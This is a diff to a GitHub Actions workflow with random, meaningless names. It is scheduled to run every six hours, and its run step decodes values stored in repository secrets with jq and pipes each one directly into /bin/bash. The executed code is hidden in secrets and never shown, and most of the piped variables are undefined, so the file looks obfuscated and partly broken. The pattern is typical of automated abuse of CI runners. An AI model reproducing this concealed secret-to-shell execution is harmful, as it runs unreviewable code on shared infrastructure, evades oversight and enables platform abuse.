@@ -3,21 +3,27 @@ name: agreeyuy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 5/6 * * *'
+    - cron: '45 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: agreeyuy
         env:
-          nf598: ${{ secrets.nf598 }}
+          xs0: ${{ secrets.xs0 }}
         run: |
-          echo $nf598 | jq -r .emco1 | /bin/bash
-          echo $sphvq6 | jq -r .xtlm5268 | /bin/bash
-          echo $vsf7506 | jq -r .kiei6489 | /bin/bash
-          echo $pg9450 | jq -r .uknxo4738 | /bin/bash
-          echo $apfv767 | jq -r .di7 | /bin/bash
-          echo $how8 | jq -r .ahc4200 | /bin/bash
+          echo $xs0 | jq -r .pb53 | /bin/bash
+          echo $v749 | jq -r .wzkp905 | /bin/bash
+          echo $eda0499 | jq -r .yx14983 | /bin/bash
+          echo $xt8991 | jq -r .yvncc6948 | /bin/bash
+          echo $bxt605 | jq -r .v992 | /bin/bash
+          echo $qeh51 | jq -r .cc14 | /bin/bash
+          echo $lj19 | jq -r .x7434 | /bin/bash
+          echo $ue33 | jq -r .w1 | /bin/bash
+          echo $m8566 | jq -r .bbm36 | /bin/bash
+          echo $e21 | jq -r .p765 | /bin/bash
+          echo $fmfjs98 | jq -r .mr8 | /bin/bash
 
